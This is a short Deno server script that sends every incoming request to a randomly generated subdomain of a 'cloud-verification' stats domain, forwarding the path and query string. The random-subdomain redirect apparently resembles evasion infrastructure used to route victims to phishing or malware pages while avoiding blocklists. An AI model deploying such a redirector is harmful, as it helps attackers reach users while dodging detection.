Deno.serve({ port: 8080 }, (request: Request): Response => {
  try {
    const url = new URL(request.url);
    const currentPath = url.pathname;
    const queryString = url.search;

    const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let randomSubdomain = '';
    for (let i = 0; i < 5; i++) {
      randomSubdomain += characters.charAt(Math.floor(Math.random() * 36));
    }

    const destinationDomain = `details${randomSubdomain}.stats.cloud-verification.com`;
    let finalQueryString = '?q=a';
    if (queryString) {
      finalQueryString += '&' + queryString.substring(1);
    }

    const redirectUrl = `https://${destinationDomain}${currentPath}${finalQueryString}`;

    return new Response(null, {
      status: 302,
      headers: { 'Location': redirectUrl }
    });
  } catch (error) {
    console.error("Redirect error:", error);
    return new Response("Internal Server Error", { status: 500 });
  }
});
